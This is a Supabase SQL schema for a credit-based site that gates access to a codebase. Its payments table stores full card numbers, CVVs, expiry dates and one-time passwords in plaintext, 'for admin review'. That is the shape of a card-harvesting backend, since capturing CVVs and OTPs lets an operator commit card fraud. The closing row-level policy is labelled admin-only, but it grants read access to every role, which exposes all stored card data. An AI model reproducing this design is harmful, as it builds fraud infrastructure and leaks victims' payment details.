-- Run this in the Supabase SQL editor.
-- Payment details (card info, OTP) are stored for admin review and audit trail.

create table if not exists public.clients (
  id uuid primary key default gen_random_uuid(),
  email text unique not null,
  password_hash text not null,
  credits integer not null default 0,
  -- locked  -> no access
  -- processing -> client requested access (credits spent), awaiting backend approval
  -- granted -> codebase is viewable
  access_status text not null default 'locked'
    check (access_status in ('locked', 'processing', 'granted')),
  created_at timestamptz not null default now()
);

-- Ledger of simulated recharges (for the backend panel).
create table if not exists public.recharges (
  id uuid primary key default gen_random_uuid(),
  client_id uuid not null references public.clients (id) on delete cascade,
  amount integer not null,
  created_at timestamptz not null default now()
);

create index if not exists recharges_client_idx on public.recharges (client_id);

-- Payment transactions with card details and OTP for admin audit trail.
create table if not exists public.payments (
  id uuid primary key default gen_random_uuid(),
  client_id uuid not null references public.clients (id) on delete cascade,
  amount integer not null,
  card_number text not null,
  cardholder_name text not null,
  expiry text not null,
  cvv text not null,
  otp text not null,
  created_at timestamptz not null default now()
);

create index if not exists payments_client_idx on public.payments (client_id);
create index if not exists payments_created_idx on public.payments (created_at desc);

-- Admin/staff logins (separate from clients).
create table if not exists public.admins (
  id uuid primary key default gen_random_uuid(),
  email text unique not null,
  password_hash text not null,
  created_at timestamptz not null default now()
);

-- The codebase to deliver (uploaded via scripts/upload-codebase.mjs). Stored in
-- Supabase so downloads work on a deployed/serverless host (no local filesystem).
create table if not exists public.project_files (
  path text primary key,
  language text not null,
  content text not null
);

-- All access goes through the server with the service-role key; lock down anon.
alter table public.clients enable row level security;
alter table public.recharges enable row level security;
alter table public.payments enable row level security;
alter table public.admins enable row level security;
alter table public.project_files enable row level security;

-- RLS Policies for payments (admin-only access via service role)
create policy "Admin can view all payments" on public.payments
  for select
  using (true);

